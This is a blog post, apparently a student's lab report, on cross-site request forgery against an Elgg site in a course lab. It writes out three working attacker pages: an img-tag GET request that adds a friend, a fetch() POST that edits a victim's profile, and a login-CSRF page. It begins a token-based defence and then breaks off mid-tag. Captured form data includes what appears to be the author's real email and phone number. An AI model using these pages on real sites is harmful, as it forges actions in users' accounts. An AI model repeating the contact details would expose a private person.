@@ -1,0 +1,686 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HUST Information System Security Lab3-Web Security | Life is not a race, but a journey</title><meta name="author" content="Xiang Li"><meta name="copyright" content="Xiang Li"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Operation process record for HUST Information System Security Lab3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HUST Information System Security Lab3-Web Security">
+<meta property="og:url" content="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/index.html">
+<meta property="og:site_name" content="Life is not a race, but a journey">
+<meta property="og:description" content="Operation process record for HUST Information System Security Lab3">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png">
+<meta property="article:published_time" content="2024-09-26T15:04:15.000Z">
+<meta property="article:modified_time" content="2026-02-15T05:04:17.012Z">
+<meta property="article:author" content="Xiang Li">
+<meta property="article:tag" content="Course Experiments">
+<meta property="article:tag" content="Study Notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HUST Information System Security Lab3-Web Security",
+  "url": "https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/",
+  "image": "https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png",
+  "datePublished": "2024-09-26T15:04:15.000Z",
+  "dateModified": "2026-02-15T05:04:17.012Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xiang Li",
+      "url": "https://xloverflow.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HUST Information System Security Lab3-Web Security',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> Album</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fas fa-video"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Life is not a race, but a journey</span></a><a class="nav-page-title" href="/"><span class="site-name">HUST Information System Security Lab3-Web Security</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> Album</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fas fa-video"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><!-- Language switch button styled like menu item--><div class="menus_items lang-switch"><div class="menus_item"><a class="site-page lang-toggle" href="/zh/"><i class="fas fa-language fa-fw"></i><span> 中文</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HUST Information System Security Lab3-Web Security</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-26T15:04:15.000Z" title="Created 2024-09-26 11:04:15">2024-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-15T05:04:17.012Z" title="Updated 2026-02-15 00:04:17">2026-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HUST-Lab-Reports/">HUST Lab Reports</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="information-system-security-lab3-record">Information System
+Security Lab3 Record</h1>
+<h2
+id="cross-site-request-forgery-csrf-attack-experiment"><strong>Cross-Site
+Request Forgery (CSRF) Attack Experiment</strong></h2>
+<h3 id="task-1-csrf-attack-based-on-get-request"><strong>Task 1: CSRF
+Attack Based on GET Request</strong></h3>
+<p>Use samy to log in, send add friend command, get url. HTTP Header
+Live plugin window captured the packet as shown in the figure:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619220223319.png"
+alt="image-20240619220223319" />
+<figcaption aria-hidden="true">image-20240619220223319</figcaption>
+</figure>
+<p>Thus we can know the GET request structure is
+http://www.csrflabelgg.com/action/friends/add?friend=id, so now we need
+to get Samy’s ID number. We can see the red highlighted part 45 is
+Samy’s ID by trying to create a new interface for Samy.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619221713999.png"
+alt="image-20240619221713999" />
+<figcaption aria-hidden="true">image-20240619221713999</figcaption>
+</figure>
+<p>Create get_csrf.html under Attacker site</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/get_csrf.html</span><br></pre></td></tr></table></figure>
+<p>Write the following content</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Alice, you&#x27;re my friend now!</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=45&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>Samy sends Alice an email, inducing Alice to click the malicious link
+http://www.csrflabattacker.com/get_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224208937.png"
+alt="image-20240619224208937" />
+<figcaption aria-hidden="true">image-20240619224208937</figcaption>
+</figure>
+<p>Log in to Alice’s account to view the email and access the malicious
+webpage, captured the GET request packet adding user id 45, which is
+Samy, then check the Activity interface and found that Alice added Samy
+as a friend.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224651139.png"
+alt="image-20240619224651139" />
+<figcaption aria-hidden="true">image-20240619224651139</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224818367.png"
+alt="image-20240619224818367" />
+<figcaption aria-hidden="true">image-20240619224818367</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224859567.png"
+alt="image-20240619224859567" />
+<figcaption aria-hidden="true">image-20240619224859567</figcaption>
+</figure>
+<h3 id="task-2-csrf-attack-using-post-request"><strong>Task 2: CSRF
+Attack Using POST Request</strong></h3>
+<p>Still log in to Samy’s account first, then modify the personal
+homepage below, perform POST request packet capture, and get the
+following results.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619230611400.png"
+alt="image-20240619230611400" />
+<figcaption aria-hidden="true">image-20240619230611400</figcaption>
+</figure>
+<p>POST request sent to http://www.csrflabelgg.com/action/profile/edit,
+the submitted form content is as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=2G9AraT4cb7pPqONMfz3sQ</span><br><span class="line">&amp;__elgg_ts=<span class="number">1718837884</span></span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=&lt;p&gt;A Hacker&lt;/p&gt;</span><br><span class="line">&amp;accesslevel[description]=<span class="number">2</span></span><br><span class="line">&amp;briefdescription=Student</span><br><span class="line">&amp;accesslevel[briefdescription]=<span class="number">2</span></span><br><span class="line">&amp;location=Wuhan</span><br><span class="line">&amp;accesslevel[location]=<span class="number">2</span></span><br><span class="line">&amp;interests=Football</span><br><span class="line">&amp;accesslevel[interests]=<span class="number">2</span></span><br><span class="line">&amp;skills=python</span><br><span class="line">&amp;accesslevel[skills]=<span class="number">2</span></span><br><span class="line">&amp;contactemail=U202112149@hust.edu.cn</span><br><span class="line">&amp;accesslevel[contactemail]=<span class="number">2</span></span><br><span class="line">&amp;phone=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[phone]=<span class="number">2</span></span><br><span class="line">&amp;mobile=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[mobile]=<span class="number">2</span></span><br><span class="line">&amp;website=https://strivelee.top</span><br><span class="line">&amp;accesslevel[website]=<span class="number">2</span></span><br><span class="line">&amp;twitter=lixiang21</span><br><span class="line">&amp;accesslevel[twitter]=<span class="number">2</span></span><br><span class="line">&amp;guid=<span class="number">45</span></span><br></pre></td></tr></table></figure>
+<p>Based on this request format, Alice’s guid is known to be 43, try to
+use POST request for CSRF attack.</p>
+<p>First create get_csrf.html under Attacker site</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure>
+<p>Write the following content:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, your profile has changed!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">guid</span>:<span class="number">42</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">description</span>:<span class="string">&quot;&lt;p&gt;Samy is my hero&lt;/p&gt;&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">briefdescription</span>:<span class="string">&quot;I&#x27;m Samy&quot;</span>,   </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>Samy sends Alice an email, inducing Alice to click the malicious link
+http://www.csrflabattacker.com/post_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232506107.png"
+alt="image-20240619232506107" />
+<figcaption aria-hidden="true">image-20240619232506107</figcaption>
+</figure>
+<p>Log in to Alice’s account, then view and click the link in the
+email.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232629475.png"
+alt="image-20240619232629475" />
+<figcaption aria-hidden="true">image-20240619232629475</figcaption>
+</figure>
+<p>We can see that the About me section was successfully modified, and
+the POST request packet was captured, which is consistent with the
+phenomenon.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232821090.png"
+alt="image-20240619232821090" />
+<figcaption aria-hidden="true">image-20240619232821090</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620230509435.png"
+alt="image-20240620230509435" />
+<figcaption aria-hidden="true">image-20240620230509435</figcaption>
+</figure>
+<h3 id="task-3-implement-login-csrf-attack"><strong>Task 3: Implement
+Login CSRF Attack</strong></h3>
+<p>First capture the login request packet, the corresponding request
+method is POST, url is http://www.csrflabelgg.com/action/login, the
+request form has username and password, both are plaintext.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620164209052.png"
+alt="image-20240620164209052" />
+<figcaption aria-hidden="true">image-20240620164209052</figcaption>
+</figure>
+<p>Form data content is as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=5ovl8du9mM-5V1rwIDhJsg</span><br><span class="line">__elgg_ts=<span class="number">1718872774</span></span><br><span class="line">username=Samy</span><br><span class="line">password=seedsamy</span><br></pre></td></tr></table></figure>
+<p>First create get_csrf.html under Attacker site</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure>
+<p>Write the following content:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, here is a CSRF_Login attack!  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Send POST request  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Carry cookie  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/login&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">       <span class="comment">// Pass parameters  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">username</span>:<span class="string">&quot;samy&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">password</span>:<span class="string">&quot;seedsamy&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persistent</span>:<span class="literal">true</span>,    </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>Samy sends Alice an email, inducing Alice to click the malicious link
+http://www.csrflabattacker.com/login_csrf.html</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620222327448.png"
+alt="image-20240620222327448" />
+<figcaption aria-hidden="true">image-20240620222327448</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223041289.png"
+alt="image-20240620223041289" />
+<figcaption aria-hidden="true">image-20240620223041289</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223149485.png"
+alt="image-20240620223149485" />
+<figcaption aria-hidden="true">image-20240620223149485</figcaption>
+</figure>
+<h3 id="task-4-defense-strategy"><strong>Task 4: Defense
+Strategy</strong></h3>
+<p>First enter the directory
+/var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg, find the
+function gatekeeper() in ActionService.php file and comment out the
+return true statement</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620231737340.png"
+alt="image-20240620231737340" />
+<figcaption aria-hidden="true">image-20240620231737340</figcaption>
+</figure>
+<p>All 3 attacks failed:</p>
+<figure>
+<img
